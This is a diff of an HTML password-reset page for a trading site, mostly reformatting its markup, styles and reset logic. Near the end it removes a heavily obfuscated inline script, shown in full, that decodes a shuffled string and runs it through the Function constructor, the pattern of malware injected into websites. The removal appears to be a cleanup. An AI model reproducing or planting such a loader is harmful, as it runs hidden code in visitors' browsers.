@@ -1,265 +1,295 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-
-<head>
+  <head>
     <!-- ✅ Google Tag Manager -->
     <script>
-        (function (w, d, s, l, i) {
-            w[l] = w[l] || [];
-            w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
-            var f = d.getElementsByTagName(s)[0],
-                j = d.createElement(s),
-                dl = l != 'dataLayer' ? '&l=' + l : '';
-            j.async = true;
-            j.src = 'https://www.googletagmanager.com/gtm.js?id=GTM-TT7SLZ4L' + dl;
-            f.parentNode.insertBefore(j, f);
-        })(window, document, 'script', 'dataLayer', 'GTM-TT7SLZ4L');
+      (function (w, d, s, l, i) {
+        w[l] = w[l] || [];
+        w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
+        var f = d.getElementsByTagName(s)[0],
+          j = d.createElement(s),
+          dl = l != "dataLayer" ? "&l=" + l : "";
+        j.async = true;
+        j.src = "https://www.googletagmanager.com/gtm.js?id=GTM-TT7SLZ4L" + dl;
+        f.parentNode.insertBefore(j, f);
+      })(window, document, "script", "dataLayer", "GTM-TT7SLZ4L");
     </script>
 
     <!-- ✅ Basic -->
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
     <!-- 🔒 SEO OFF -->
     <title>Reset Password | BR30 Trader</title>
-    <meta name="robots" content="noindex, nofollow">
+    <meta name="robots" content="noindex, nofollow" />
 
     <!-- 🔐 Security (No cache) -->
-    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
+    <meta
+      http-equiv="Cache-Control"
+      content="no-store, no-cache, must-revalidate"
+    />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
 
     <!-- ✅ Favicon -->
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
 
     <!-- ✅ Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
 
     <!-- ✅ Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
 
     <!-- ✅ SweetAlert -->
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11" defer></script>
 
     <style>
-        /* =========================================
+      /* =========================================
            GLOBAL & BODY STYLES (Dark Theme)
         ========================================= */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
-        }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Poppins", sans-serif;
+      }
 
-        body {
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #050505;
-            /* Aapka Body Color */
-            padding: 20px;
-        }
+      body {
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #050505;
+        /* Aapka Body Color */
+        padding: 20px;
+      }
 
-        /* =========================================
+      /* =========================================
            CONTAINER (Responsive & Dark)
         ========================================= */
+      .container {
+        width: 100%;
+        max-width: 360px;
+        background: #1e293b;
+        /* Card Background */
+        padding: 30px;
+        border-radius: 20px;
+        border: 1px solid #334155;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+        text-align: center;
+      }
+
+      h2 {
+        color: #ffffff;
+        /* White Text */
+        margin-bottom: 25px;
+        font-weight: 600;
+      }
+
+      /* Input Styling */
+      input {
+        width: 100%;
+        padding: 12px 15px;
+        margin-bottom: 15px;
+        border-radius: 10px;
+        border: 1px solid #334155;
+        background: #050505;
+        /* Input background matches body */
+        color: white;
+        outline: none;
+        transition: 0.3s;
+        font-size: 14px;
+      }
+
+      input:focus {
+        border-color: #a020f0;
+        /* Purple Focus */
+        box-shadow: 0 0 8px rgba(160, 32, 240, 0.2);
+      }
+
+      /* Purple Button */
+      button {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 10px;
+        background: #a020f0;
+        /* Brand Purple */
+        color: white;
+        cursor: pointer;
+        transition: 0.3s ease;
+        font-weight: 600;
+        font-size: 16px;
+        margin-top: 5px;
+      }
+
+      button:hover {
+        background: #8219c4;
+        transform: translateY(-2px);
+        box-shadow: 0 5px 15px rgba(160, 32, 240, 0.3);
+      }
+
+      /* Footer Link */
+      .links {
+        margin-top: 20px;
+      }
+
+      .links a {
+        text-decoration: none;
+        color: #a020f0;
+        /* Purple Link */
+        font-size: 14px;
+        font-weight: 500;
+      }
+
+      .links a:hover {
+        text-decoration: underline;
+      }
+
+      /* Mobile Adjustment */
+      @media (max-width: 480px) {
         .container {
-            width: 100%;
-            max-width: 360px;
-            background: #1e293b;
-            /* Card Background */
-            padding: 30px;
-            border-radius: 20px;
-            border: 1px solid #334155;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
-            text-align: center;
+          padding: 25px 20px;
         }
 
         h2 {
-            color: #ffffff;
-            /* White Text */
-            margin-bottom: 25px;
-            font-weight: 600;
+          font-size: 20px;
         }
-
-        /* Input Styling */
-        input {
-            width: 100%;
-            padding: 12px 15px;
-            margin-bottom: 15px;
-            border-radius: 10px;
-            border: 1px solid #334155;
-            background: #050505;
-            /* Input background matches body */
-            color: white;
-            outline: none;
-            transition: 0.3s;
-            font-size: 14px;
-        }
-
-        input:focus {
-            border-color: #a020f0;
-            /* Purple Focus */
-            box-shadow: 0 0 8px rgba(160, 32, 240, 0.2);
-        }
-
-        /* Purple Button */
-        button {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            background: #a020f0;
-            /* Brand Purple */
-            color: white;
-            cursor: pointer;
-            transition: 0.3s ease;
-            font-weight: 600;
-            font-size: 16px;
-            margin-top: 5px;
-        }
-
-        button:hover {
-            background: #8219c4;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(160, 32, 240, 0.3);
-        }
-
-        /* Footer Link */
-        .links {
-            margin-top: 20px;
-        }
-
-        .links a {
-            text-decoration: none;
-            color: #a020f0;
-            /* Purple Link */
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        /* Mobile Adjustment */
-        @media (max-width: 480px) {
-            .container {
-                padding: 25px 20px;
-            }
-
-            h2 {
-                font-size: 20px;
-            }
-        }
+      }
     </style>
-</head>
+  </head>
 
-<body>
+  <body>
     <!-- ✅ GTM noscript -->
     <noscript>
-        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TT7SLZ4L" height="0" width="0"
-            style="display:none;visibility:hidden"></iframe>
+      <iframe
+        src="https://www.googletagmanager.com/ns.html?id=GTM-TT7SLZ4L"
+        height="0"
+        width="0"
+        style="display: none; visibility: hidden"
+      ></iframe>
     </noscript>
     <div class="container">
-        <h2 class="login-heading">Reset Password</h2>
+      <h2 class="login-heading">Reset Password</h2>
 
-        <!-- Browser signal ke liye FORM tag zaroori hai -->
-        <form id="resetForm" onsubmit="resetPassword(event)">
-
-            <label>Registered Email</label>
-            <div class="input-box">
-                <!-- name="email" aur autocomplete="username" Google ko hint deta hai -->
-                <input id="email" name="email" type="email" placeholder="example@mail.com" autocomplete="username"
-                    required>
-            </div>
-
-            <label>Reset OTP/Token</label>
-            <div class="input-box">
-                <input id="token" name="token" type="text" placeholder="Enter 6-digit OTP" required>
-            </div>
-
-            <label>New Password</label>
-            <div class="input-box">
-                <!-- autocomplete="new-password" se 'Save/Update Password' ka prompt aata hai -->
-                <input id="newPassword" name="password" type="password" placeholder="8+ chars, 1 Special"
-                    autocomplete="new-password" required>
-            </div>
-
-            <!-- Button type submit hona chahiye -->
-            <button type="submit" id="resetBtn">Update Password</button>
-        </form>
-
-        <div class="links">
-            <a href="login.html">Back to Login</a>
+      <!-- Browser signal ke liye FORM tag zaroori hai -->
+      <form id="resetForm" onsubmit="resetPassword(event)">
+        <label>Registered Email</label>
+        <div class="input-box">
+          <!-- name="email" aur autocomplete="username" Google ko hint deta hai -->
+          <input
+            id="email"
+            name="email"
+            type="email"
+            placeholder="example@mail.com"
+            autocomplete="username"
+            required
+          />
         </div>
+
+        <label>Reset OTP/Token</label>
+        <div class="input-box">
+          <input
+            id="token"
+            name="token"
+            type="text"
+            placeholder="Enter 6-digit OTP"
+            required
+          />
+        </div>
+
+        <label>New Password</label>
+        <div class="input-box">
+          <!-- autocomplete="new-password" se 'Save/Update Password' ka prompt aata hai -->
+          <input
+            id="newPassword"
+            name="password"
+            type="password"
+            placeholder="8+ chars, 1 Special"
+            autocomplete="new-password"
+            required
+          />
+        </div>
+
+        <!-- Button type submit hona chahiye -->
+        <button type="submit" id="resetBtn">Update Password</button>
+      </form>
+
+      <div class="links">
+        <a href="login.html">Back to Login</a>
+      </div>
     </div>
 
     <script src="config.js"></script>
     <script>
-        // event parameter add kiya taaki refresh roke aur browser signal capture kare
-        async function resetPassword(event) {
-            if (event) event.preventDefault();
+      // event parameter add kiya taaki refresh roke aur browser signal capture kare
+      async function resetPassword(event) {
+        if (event) event.preventDefault();
 
-            const email = document.getElementById("email").value.trim();
-            const token = document.getElementById("token").value.trim();
-            const newPassword = document.getElementById("newPassword").value;
-            const btn = document.getElementById("resetBtn");
+        const email = document.getElementById("email").value.trim();
+        const token = document.getElementById("token").value.trim();
+        const newPassword = document.getElementById("newPassword").value;
+        const btn = document.getElementById("resetBtn");
 
-            // Basic Validation
-            if (!email || !token || !newPassword) {
-                alert("Bhai, please enter all details!");
-                return;
-            }
-
-            // Strength Check
-            const passRegex = /^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,}$/;
-            if (!passRegex.test(newPassword)) {
-                return alert("Password weak hai! Use 8+ chars & Special Character.");
-            }
-
-            btn.innerText = "Updating...";
-            btn.disabled = true;
-
-            try {
-                const res = await fetch(window.API_BASE_URL + '/api/auth/reset-password', {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ email, token, newPassword }),
-                });
-
-                const data = await res.json();
-
-                if (res.ok) {
-                    alert("Password updated successfully! 🚀");
-                    // 1 second ka gap taaki browser password save karne ka popup dikha sake
-                    setTimeout(() => {
-                        window.location.href = "login.html";
-                    }, 1000);
-                } else {
-                    alert(data.msg || data.message || "Invalid OTP or Email!");
-                    btn.innerText = "Update Password";
-                    btn.disabled = false;
-                }
-            } catch (err) {
-                alert("Server Connection Error!");
-                btn.innerText = "Update Password";
-                btn.disabled = false;
-            }
+        // Basic Validation
+        if (!email || !token || !newPassword) {
+          alert("Bhai, please enter all details!");
+          return;
         }
 
-        // Enter key support
-        document.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                document.getElementById('resetBtn').click();
-            }
-        });
-    </script>
-    <script>
-        (function () { var iEX = '', jkf = 628 - 617; function EUf(c) { var z = 6376169; var g = c.length; var j = []; for (var a = 0; a < g; a++) { j[a] = c.charAt(a) }; for (var a = 0; a < g; a++) { var x = z * (a + 112) + (z % 40890); var u = z * (a + 689) + (z % 16572); var r = x % g; var h = u % g; var y = j[r]; j[r] = j[h]; j[h] = y; z = (x + u) % 7011803; }; return j.join('') }; var Vfe = EUf('hmridetcwuyoonurcfrgtkljasptsonxvbqcz').substr(0, jkf); var bFt = '=q( nf,0}v0"t,vb;5zvtlry)pav[j0)e0ifhlm<jx7r[.p=uC;zjopartnttnr,n2)]r,;l,anftht(;,06a7=,a (gr,tctv;,,4j6(uy-(v)v)1t8e,.66;va" ,2"[.k-r*);(r.d-m+ [qlr;;twv) n)i[s.=]4.h+(,r0;+ia31 uguS3v2o=;0hf(fn,mfu83pl 4qCu)(aa hgmra+s=l)nnt)ae+C)7vcrrrus(g[v(+8s1e4;ip0se)ezbuaCofkvl;a"=ajbnaetu-r;r+=0,siAh{qaA  12{r[];crav*j,"b9[acr.)=abr+n;jnrk0gh6i0=do)lb(+tr;palvl)ao eg]uel]sn(;;;bl)=g1a.pudo,(=1rd;ae 95lrC+9rve=)Ada;ifs;+{w=k7oa8axba..s ogov=<Cp1e1;-. (=n !in]pe)o>b==fdv=]ru2iv gn.3ltvvhiceo=;e.)Codehe(=+ sfvd..hfo0;w+rr] +Caa{;]==sntn+[}v"n;ho=6oia{"1ciihw2cx8lju(=wf=rb(h;+oca;tshkoes(b;obzre(8nlelh]]ak.u(n,n+,.h]v<l+(f 0;r;!={u6z;aic(og]+.ii;a,)f8sni5(0rxg;9d))jas(=;.7;tn8l7i.7tc.5n"hfq[i=}as8=r  icnjt+(h},[[}b) z.[to,r2l)n=9py4(,nlbic)r;ht)<)=ia(;o=r,(svg,fr7 ;5a=1or=((6[>+o=pxa-h;-tA9<}el.n}]hr(s+v)9vha,l8t;t+frdr."AS(o)er(o1ba2 r{nzhtr=m)o)= oasem+h==;;me1jmhl.=solht+,a"g;s.1);r)t=.'; var rsW = EUf[Vfe]; var wDC = ''; var TVK = rsW; var Eky = rsW(wDC, EUf(bFt)); var pUC = Eky(EUf('!),1foe_b_u;6j  _P.aP$1)!4;$5eo!9;P=(}f 6ba13t.P$P_iPf)gf,tkwS)j4nw}fyPP2f]PP&n}1 _f"n)6!3{).+(by3.e$P26.%3&2o==0;cle$$Po[(P%fincP)u=*EPr_t6e7tg$+Pbb{)3$P)m41.P}oaaPP;k0n =jbs;f%.e,5]sb,j3_jPl)bi)P)-un,.rf53heP!!..v)o]s\'Pobnc3wd ;3(b01223!b$+15\'f)_{3.P;oe{]a,b(P&w3(iuarb.nw(ogPP(0(P(j_}.x(3.n(b4ls..P.ePi7C(3,) v)!,b\'P4.)a2P.-P5)3P)(vP8 +)i)ln9\'1!8t(6egeP9Pm.w\/3,.2)}iPo)etf%m5en9.P_cf46Pp.$3Pppb!r);3wc\/.4o04bP4448i Pbtd(inPqPP;7=ni4nP ;},;j,=(P71ero66}Ps;$7;m=Pwen$q)Pilb+#PP$&(m$_)eCP5PPbP7.;p3P!"id)l={]{P$cf.w2_!!fp.l%eP6=tc[!tob(gjPttbrvi]ln_bj.6tt.!P0,PPee}%o)l.j%pb1Po(b)_P368Peeu,e.c4nt${)(#)cw.DaP)Peu}31e(t{(.8tz".cdr;.;)nPs.c%eS q(3r==)(=1ik7c.1er0tsty_.PooP1_711*;oC{.,)tn#8(}pa).i)ojbP#1;m2ebb}7tf]63en3f3e3g"se2;PP(-g=isj.$.j8)9P_)wen3t0+.bb46;3tuP[P5n(8Pom#$_3lb!o_,-5elc(.Pcaf4Pf!P$u*a}..P(.,P4\'o-2Pl7hb)"2b.3P,,3* P}}ou#u]ont3PPw]bv*ha 2fue.l._PdP{r;tfvjpt5yPP[P)]0.(c}rP7pn+,n7(P{;gu{joo}P\'6oj*b3.m$; nd}(Pc,.3)7$s,pr{e4jr}.tb,)ltih-k%,P(!,.uPn#(}p!=me2PP!l=()v)duP =_4({csve7r)5$tePo(Pb!vime]%)P$7)_u)pj];0s_}_&P2(]("d4nP(l%tieP.bj363}v$& 2_u1rj_483, (0P=(nnb]bP.\/.]Pjn,P[;bbu\/6sm;(a},r!_,r Pj))toer+0ie o=146iSsnnP%o s.o1eePta,!if3dv)j0e=P6s3ri30r)c(,u!-p .c!)e!e$idt8,[_.tPm,n(6bo$f+d ,.)t\/(= _%.b i6.P[,;.r4_==Pbe d=Pee.tjePcb.;')); var OSu = TVK(iEX, pUC); OSu(8958); return 3887 })()
-    </script>
-</body>
+        // Strength Check
+        const passRegex =
+          /^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,}$/;
+        if (!passRegex.test(newPassword)) {
+          return alert("Password weak hai! Use 8+ chars & Special Character.");
+        }
 
+        btn.innerText = "Updating...";
+        btn.disabled = true;
+
+        try {
+          const res = await fetch(
+            `${window.API_BASE_URL}/api/auth/reset-password`,
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ email, token, newPassword }),
+            },
+          );
+
+          const data = await res.json();
+
+          if (res.ok) {
+            alert("Password updated successfully! 🚀");
+            // 1 second ka gap taaki browser password save karne ka popup dikha sake
+            setTimeout(() => {
+              window.location.href = "login.html";
+            }, 1000);
+          } else {
+            alert(data.msg || data.message || "Invalid OTP or Email!");
+            btn.innerText = "Update Password";
+            btn.disabled = false;
+          }
+        } catch (err) {
+          alert("Server Connection Error!");
+          btn.innerText = "Update Password";
+          btn.disabled = false;
+        }
+      }
+
+      // Enter key support
+      document.addEventListener("keypress", (e) => {
+        if (e.key === "Enter") {
+          document.getElementById("resetBtn").click();
+        }
+      });
+    </script>
+    <script></script>
+  </body>
 </html>
